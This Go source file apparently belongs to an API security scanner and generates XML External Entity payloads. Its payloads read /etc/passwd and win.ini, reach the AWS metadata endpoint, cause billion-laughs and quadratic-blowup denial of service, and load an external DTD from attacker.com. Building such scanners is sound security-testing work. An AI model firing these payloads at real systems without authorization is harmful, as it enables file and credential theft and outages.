package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// XXEGenerator generates XML External Entity attack payloads
type XXEGenerator struct{}

// NewXXEGenerator creates a new XXE payload generator
func NewXXEGenerator() *XXEGenerator {
	return &XXEGenerator{}
}

// Type returns the attack type
func (g *XXEGenerator) Type() string {
	return types.AttackXXE
}

// Generate generates XXE payloads for a parameter
func (g *XXEGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target string parameters
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	// Check if parameter or endpoint is relevant for XXE
	if !g.isXXERelevant(param, endpoint) {
		return payloads
	}

	// Standard XXE file read payloads
	payloads = append(payloads, g.standardXXEPayloads()...)

	// Entity expansion (DoS) payloads
	payloads = append(payloads, g.entityExpansionPayloads()...)

	// External DTD payloads
	payloads = append(payloads, g.externalDTDPayloads()...)

	// XXE via file format payloads
	payloads = append(payloads, g.xxeViaFileFormatPayloads()...)

	return payloads
}

// isXXERelevant checks if parameter or endpoint is relevant for XXE attacks
func (g *XXEGenerator) isXXERelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	// Check if endpoint accepts XML content
	if endpoint.Body != nil {
		contentType := strings.ToLower(endpoint.Body.ContentType)
		xmlContentTypes := []string{"xml", "soap", "svg"}
		for _, ct := range xmlContentTypes {
			if strings.Contains(contentType, ct) {
				return true
			}
		}
	}

	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// XML-related parameter names
	xmlParamPatterns := []string{
		"xml", "data", "payload", "document", "import", "upload",
		"feed", "config", "soap", "svg", "rss", "content",
		"input", "file", "body", "template",
	}

	for _, pattern := range xmlParamPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// XML-related endpoint paths
	xmlEndpointPatterns := []string{
		"/xml", "/soap", "/feed", "/rss", "/import",
		"/upload", "/svg", "/config", "/document",
	}

	for _, ep := range xmlEndpointPatterns {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	return false
}

// standardXXEPayloads generates file read XXE payloads
func (g *XXEGenerator) standardXXEPayloads() []Payload {
	return []Payload{
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			Type:        types.AttackXXE,
			Category:    "file_read",
			Description: "XXE: Read /etc/passwd via SYSTEM entity",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
			Type:        types.AttackXXE,
			Category:    "file_read",
			Description: "XXE: Read win.ini via SYSTEM entity (Windows)",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
			Type:        types.AttackXXE,
			Category:    "file_read",
			Description: "XXE: SSRF to AWS metadata endpoint",
		},
	}
}

// entityExpansionPayloads generates DoS detection payloads via entity expansion
func (g *XXEGenerator) entityExpansionPayloads() []Payload {
	return []Payload{
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>`,
			Type:        types.AttackXXE,
			Category:    "dos",
			Description: "XXE: Billion laughs (compact nested entity expansion)",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>`,
			Type:        types.AttackXXE,
			Category:    "dos",
			Description: "XXE: Quadratic blowup via repeated large entity",
		},
	}
}

// externalDTDPayloads generates parameter entity injection payloads
func (g *XXEGenerator) externalDTDPayloads() []Payload {
	return []Payload{
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>`,
			Type:        types.AttackXXE,
			Category:    "external_dtd",
			Description: "XXE: Parameter entity injection via external DTD",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>test</foo>`,
			Type:        types.AttackXXE,
			Category:    "external_dtd",
			Description: "XXE: External DTD reference via DOCTYPE SYSTEM",
		},
	}
}

// xxeViaFileFormatPayloads generates XXE embedded in various file formats
func (g *XXEGenerator) xxeViaFileFormatPayloads() []Payload {
	return []Payload{
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
			Type:        types.AttackXXE,
			Category:    "file_format",
			Description: "XXE: SVG image with external entity file read",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>`,
			Type:        types.AttackXXE,
			Category:    "file_format",
			Description: "XXE: SOAP envelope with external entity file read",
		},
		{
			Value:       `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&xxe;</title><item><title>test</title></item></channel></rss>`,
			Type:        types.AttackXXE,
			Category:    "file_format",
			Description: "XXE: RSS feed with external entity file read",
		},
	}
}
